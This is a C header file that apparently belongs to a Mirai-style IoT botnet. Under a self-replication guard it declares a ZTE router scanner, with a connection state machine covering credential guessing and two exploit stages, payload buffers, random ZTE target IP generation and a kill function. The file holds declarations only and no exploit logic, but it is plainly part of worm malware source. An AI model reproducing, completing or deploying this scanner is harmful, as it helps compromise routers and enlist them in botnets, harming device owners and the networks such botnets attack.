#ifdef SELFREP
#pragma once
#include <stdint.h>
#include "includes.h"
#define ZTE_SCANNER_MAX_CONNS   256
#define ZTE_SCANNER_RAW_PPS     788
#define ZTE_SCANNER_RDBUF_SIZE  1080
#define ZTE_SCANNER_HACK_DRAIN  64
struct zte_scanner_connection
{
    int fd, last_recv;
    enum
    {
        ZTE_SC_CLOSED,
        ZTE_SC_CONNECTING,
        ZTE_SC_GET_CREDENTIALS,
        ZTE_SC_EXPLOIT_STAGE2,
        ZTE_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[ZTE_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};
void zte_scanner();
void zte_kill(void);
static void zte_setup_connection(struct zte_scanner_connection *);
static ipv4_t get_random_zte_ip(void);
#endif
